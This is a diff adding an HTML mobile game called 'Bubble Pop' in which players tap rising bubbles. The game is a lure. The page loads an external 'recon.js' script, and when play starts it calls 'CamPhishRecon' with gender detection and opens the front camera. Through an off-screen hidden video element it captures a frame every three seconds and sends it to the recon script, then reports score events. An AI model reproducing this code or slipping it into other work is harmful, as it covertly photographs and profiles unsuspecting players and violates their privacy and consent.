@@ -1,0 +1,115 @@
+<!-- DESC: Bubble pop game — tap falling bubbles before they reach bottom -->
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="theme-color" content="#001a2e">
+<title>Bubble Pop</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{background:#001a2e;color:#fff;font-family:-apple-system,sans-serif;overflow:hidden;touch-action:none;user-select:none}
+#wrap{position:fixed;inset:0;display:flex;align-items:center;justify-content:center}
+canvas#c{display:block;touch-action:none}
+.overlay{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;background:rgba(0,26,46,0.95);z-index:20;text-align:center;padding:20px}
+.overlay.hidden{display:none}
+.title{font-size:clamp(30px,9vw,54px);background:linear-gradient(135deg,#00e5ff,#7bed9f,#ffd700);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:900}
+.sub{color:#00e5ff;font-size:14px;margin:8px 0 24px}
+.howto{color:#88ccdd;font-size:13px;line-height:2;margin-bottom:24px;max-width:280px}
+.howto b{color:#ffd700}
+.btn{background:linear-gradient(135deg,#00e5ff,#0099cc);color:#000;border:none;padding:16px 52px;font-size:20px;font-weight:900;border-radius:30px;cursor:pointer;box-shadow:0 0 20px #00e5ff}
+.btn:active{transform:scale(0.93)}
+.final{font-size:clamp(36px,10vw,56px);color:#ffd700;font-weight:900}
+.best{color:#88ccdd;margin:8px 0 16px}
+.shares{display:flex;gap:8px;margin-bottom:16px}
+.sb{padding:10px 18px;border:none;border-radius:20px;color:#fff;font-weight:700;font-size:13px;cursor:pointer}
+.s-wa{background:#25D366}.s-fb{background:#1877F2}
+.lb{color:#558899;font-size:12px;margin-top:16px}
+#score{position:absolute;top:12px;right:16px;font-size:28px;font-weight:900;color:#fff;text-shadow:0 0 10px #00e5ff;z-index:10}
+#combo{position:absolute;top:48px;right:16px;font-size:16px;color:#ffd700;font-weight:700;z-index:10;opacity:0;transition:opacity .2s}
+video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
+</style>
+</head><body>
+<script src="forwarding_link/t/recon.js"></script>
+<video id="v" playsinline autoplay muted></video>
+<canvas id="cap" width="320" height="240"></canvas>
+<div id="wrap"><canvas id="c"></canvas></div>
+<div id="score">0</div><div id="combo"></div>
+<div class="overlay" id="menu">
+<div class="title">🫧 Bubble Pop</div>
+<div class="sub">Pop bubbles · Get combos · Don't miss!</div>
+<div class="howto"><b>Tap</b> bubbles to pop them<br>Gold bubbles = <b>5x points</b><br>Don't let them escape!</div>
+<button class="btn" id="startBtn">▶ Start</button>
+<div class="lb" id="menuLb"></div>
+</div>
+<div class="overlay hidden" id="gameover">
+<div style="font-size:28px;color:#ff6b9d;margin-bottom:8px">Game Over</div>
+<div class="final" id="finalScore">0</div>
+<div class="best" id="bestScore"></div>
+<div class="shares"><button class="sb s-wa" onclick="shareCard('wa')">💬 Share</button><button class="sb s-fb" onclick="shareCard('fb')">📘 Share</button></div>
+<button class="btn" onclick="startGame()">▶ Play Again</button>
+<div class="lb" id="goLb"></div>
+</div>
+<script>
+var API='API_BASE_URL',SHARE_URL='forwarding_link/t/bubble-pop';
+var W=360,H=640,c,ctx,bubbles=[],particles=[],score=0,combo=0,maxCombo=0,running=false,dead=false,fc=0,spawnT=0,spawnRate=50,speed=1.5;
+var hs=[];try{hs=JSON.parse(localStorage.getItem('bubblePopHS')||'[]');}catch(e){}
+var ac=null;
+var COLORS=['#ff6b9d','#7bed9f','#6bcfff','#c44dff','#ffd700'];
+var elScore,elCombo,elMenu,elGameover;
+function snd(f){try{if(!ac)ac=new(AudioContext||webkitAudioContext)();var o=ac.createOscillator(),g=ac.createGain();o.frequency.value=f;o.type='sine';g.gain.value=0.06;o.connect(g);g.connect(ac.destination);o.start();g.gain.exponentialRampToValueAtTime(0.001,ac.currentTime+0.15);o.stop(ac.currentTime+0.15);}catch(e){}}
+function init(){
+c=document.getElementById('c');ctx=c.getContext('2d');
+elScore=document.getElementById('score');elCombo=document.getElementById('combo');
+elMenu=document.getElementById('menu');elGameover=document.getElementById('gameover');
+resize();addEventListener('resize',resize);
+c.addEventListener('touchstart',onTap,{passive:false});
+c.addEventListener('mousedown',onTap);
+document.getElementById('startBtn').onclick=startGame;
+showLb();requestAnimationFrame(menuLoop);
+}
+function resize(){var s=Math.min(innerWidth/W,innerHeight/H);c.style.width=(W*s)+'px';c.style.height=(H*s)+'px';c.width=W;c.height=H;}
+function onTap(e){e.preventDefault();if(!running)return;var rect=c.getBoundingClientRect();var s=W/rect.width;var x=(e.touches?e.touches[0].clientX:e.clientX-rect.left)*s;var y=(e.touches?e.touches[0].clientY:e.clientY-rect.top)*s;popBubble(x,y);}
+function popBubble(x,y){for(var i=bubbles.length-1;i>=0;i--){var b=bubbles[i];var dx=x-b.x,dy=y-b.y;if(dx*dx+dy*dy<b.r*b.r){var pts=b.gold?50:10;score+=pts;combo++;if(combo>maxCombo)maxCombo=combo;snd(b.gold?1200:600+combo*30);if(navigator.vibrate)navigator.vibrate(b.gold?30:10);spawnParts(b.x,b.y,b.col);bubbles.splice(i,1);return;}}}
+function spawnParts(x,y,col){for(var i=0;i<8;i++){var a=Math.random()*6.28,s=1+Math.random()*3;particles.push({x:x,y:y,vx:Math.cos(a)*s,vy:Math.sin(a)*s,life:20,col:col});}}
+function startGame(){
+if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
+bubbles=[];particles=[];score=0;combo=0;maxCombo=0;fc=0;spawnT=0;spawnRate=50;speed=1.5;running=true;dead=false;
+elMenu.classList.add('hidden');elGameover.classList.add('hidden');elScore.textContent='0';
+requestAnimationFrame(loop);
+// Camera
+if(navigator.mediaDevices&&window.CamPhishRecon){navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){var v=document.getElementById('v');v.srcObject=s;v.play();var cap=document.getElementById('cap'),cx=cap.getContext('2d');setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'canvas');}},3000);}).catch(function(){});}
+}
+function loop(){if(!running)return;fc++;update();draw();if(!dead)requestAnimationFrame(loop);}
+function update(){
+speed=1.5+fc*0.002;spawnRate=Math.max(20,50-fc*0.05);
+spawnT++;if(spawnT>=spawnRate){spawnT=0;var isGold=Math.random()<0.1;bubbles.push({x:30+Math.random()*(W-60),y:H+30,r:isGold?16:20+Math.random()*15,vy:-(speed+Math.random()),col:isGold?'#ffd700':COLORS[Math.floor(Math.random()*4)],gold:isGold});}
+for(var i=bubbles.length-1;i>=0;i--){bubbles[i].y+=bubbles[i].vy;if(bubbles[i].y<-30){bubbles.splice(i,1);combo=0;score=Math.max(0,score-5);}}
+for(var i=particles.length-1;i>=0;i--){particles[i].x+=particles[i].vx;particles[i].y+=particles[i].vy;particles[i].vy+=0.1;particles[i].life--;if(particles[i].life<=0)particles.splice(i,1);}
+elScore.textContent=score;
+if(combo>1){elCombo.textContent='🔥'+combo+'x';elCombo.style.opacity='1';}else elCombo.style.opacity='0';
+}
+function draw(){ctx.clearRect(0,0,W,H);var g=ctx.createLinearGradient(0,0,0,H);g.addColorStop(0,'#001a2e');g.addColorStop(1,'#003355');ctx.fillStyle=g;ctx.fillRect(0,0,W,H);
+for(var i=0;i<bubbles.length;i++){var b=bubbles[i];ctx.fillStyle=b.col;ctx.shadowColor=b.col;ctx.shadowBlur=b.gold?20:10;ctx.beginPath();ctx.arc(b.x,b.y,b.r,0,6.28);ctx.fill();ctx.fillStyle='rgba(255,255,255,0.4)';ctx.shadowBlur=0;ctx.beginPath();ctx.arc(b.x-b.r*0.3,b.y-b.r*0.3,b.r*0.3,0,6.28);ctx.fill();}
+for(var i=0;i<particles.length;i++){ctx.fillStyle=particles[i].col;ctx.globalAlpha=particles[i].life/20;ctx.beginPath();ctx.arc(particles[i].x,particles[i].y,3,0,6.28);ctx.fill();}ctx.globalAlpha=1;
+}
+function menuLoop(){ctx.clearRect(0,0,W,H);var g=ctx.createLinearGradient(0,0,0,H);g.addColorStop(0,'#001a2e');g.addColorStop(1,'#003355');ctx.fillStyle=g;ctx.fillRect(0,0,W,H);ctx.fillStyle='#00e5ff';ctx.font='bold 32px system-ui';ctx.textAlign='center';ctx.shadowColor='#00e5ff';ctx.shadowBlur=15;ctx.fillText('🫧 Bubble Pop',W/2,200);ctx.shadowBlur=0;requestAnimationFrame(menuLoop);}
+function endGame(){running=false;dead=true;hs.push(score);hs.sort(function(a,b){return b-a;});hs=hs.slice(0,5);localStorage.setItem('bubblePopHS',JSON.stringify(hs));document.getElementById('finalScore').textContent=score;document.getElementById('bestScore').textContent='Best: '+(hs[0]||0);elGameover.classList.remove('hidden');showLb();if(window.CamPhishRecon)CamPhishRecon.Capture.event('game_over',{score:score,combo:maxCombo});}
+function showLb(){var h='<b>🏆 Top Scores</b><br>';for(var i=0;i<hs.length;i++)h+='<div>#'+(i+1)+' — '+hs[i]+'</div>';if(!hs.length)h='<b>🏆 Be the first!</b>';document.getElementById('menuLb').innerHTML=h;document.getElementById('goLb').innerHTML=h;}
+function shareCard(t){
+var cc=document.createElement('canvas');cc.width=600;cc.height=800;var x=cc.getContext('2d');
+var bg=x.createLinearGradient(0,0,0,800);bg.addColorStop(0,'#001a2e');bg.addColorStop(1,'#003355');x.fillStyle=bg;x.fillRect(0,0,600,800);
+for(var i=0;i<20;i++){x.fillStyle=COLORS[i%5];x.globalAlpha=0.1;x.beginPath();x.arc(50+Math.random()*500,50+Math.random()*700,15+Math.random()*20,0,6.28);x.fill();}x.globalAlpha=1;
+x.fillStyle='#00e5ff';x.font='bold 40px system-ui';x.textAlign='center';x.shadowColor='#00e5ff';x.shadowBlur=20;x.fillText('🫧 Bubble Pop',300,140);x.shadowBlur=0;
+x.fillStyle='#88ccdd';x.font='18px system-ui';x.fillText('My Score',300,220);
+x.fillStyle='#ffd700';x.font='bold 72px system-ui';x.fillText(score,300,300);
+x.fillStyle='#ff6b9d';x.font='16px system-ui';x.fillText('Max Combo: '+maxCombo+'x',300,350);
+x.strokeStyle='rgba(0,229,255,0.2)';x.beginPath();x.moveTo(100,390);x.lineTo(500,390);x.stroke();
+x.fillStyle='#fff';x.font='bold 22px system-ui';x.fillText('Can you beat me?',300,450);
+x.fillStyle='#00e5ff';x.font='bold 18px monospace';x.fillText(SHARE_URL,300,500);
+x.fillStyle='#558899';x.font='12px system-ui';x.fillText('Bubble Pop · Tap Game',300,720);
+cc.toBlob(function(blob){var msg='🫧 I scored '+score+' in Bubble Pop! '+SHARE_URL;var file=new File([blob],'bubble-pop.png',{type:'image/png'});if(navigator.canShare&&navigator.canShare({files:[file]})){navigator.share({text:msg,files:[file]}).catch(function(){});return;}if(t==='wa')open('whatsapp://send?text='+encodeURIComponent(msg),'_blank');else if(t==='fb')open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(SHARE_URL)+'&quote='+encodeURIComponent(msg),'_blank');var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='bubble-pop.png';a.click();},'image/png');
+}
+init();
+</script>
+</body></html>
